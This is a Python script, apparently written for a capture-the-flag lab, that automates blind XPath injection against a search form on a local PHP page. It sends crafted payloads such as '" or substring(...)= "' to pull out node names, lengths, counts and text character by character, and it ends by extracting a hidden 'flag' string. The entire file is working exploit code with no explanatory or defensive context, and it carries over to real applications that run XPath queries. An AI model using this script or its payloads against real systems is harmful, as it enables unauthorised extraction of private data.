import requests
import string

true_string = 'Some fake description 1'


def is_true(a):
    payload = {'search': a, 'submit': ''}
    response = requests.post('http://localhost/xml/xpath2/index.php', data=payload)
    return true_string in response.text


def substring_node_name(path, pos, letter):
    pattern = '" or substring(name(%s),%s,1)= "%s'
    return pattern % (path, pos, letter)


def substring_text(path, pos, letter):
    pattern = '" or substring(%s,%s,1)= "%s'
    return pattern % (path, pos, letter)


def get_char_node_name(path, i):
    lol = list(string.printable)
    for kek in lol:
        if is_true(substring_node_name(path, i, kek)):
            return kek


def get_char_text(path, i):
    lol = list(string.printable)
    for kek in lol:
        if is_true(substring_text(path, i, kek)):
            return kek


def get_length_node_name(path):
    pattern = '" or string-length(name(%s))= "%s'
    i = 0
    while not is_true(pattern % (path, i)):
        i = i + 1
    return i


def get_length_text(path):
    pattern = '" or string-length(%s)= "%s'
    i = 0
    while not is_true(pattern % (path, i)):
        i = i + 1
    return i


def get_node_name(path):
    length = get_length_node_name(path)
    stroka = ''
    for sex_path in range(length):
        stroka = stroka + get_char_node_name(path, sex_path + 1)
    return stroka


def get_text(path):
    length = get_length_text(path)
    stroka = ''
    for sex_path in range(length):
        stroka = stroka + get_char_text(path, sex_path + 1)
    return stroka


def get_child_num(path):
    pattern = '" or count(%s)= "%s'
    i = 0
    while not is_true(pattern % (path, i)):
        i = i + 1
    return i



print get_text("//*[text()[contains(.,'flag')]]/text()")
#print get_child_num("//Secret")
#print get_node_name("//*[text()[contains(.,'flag')]]")


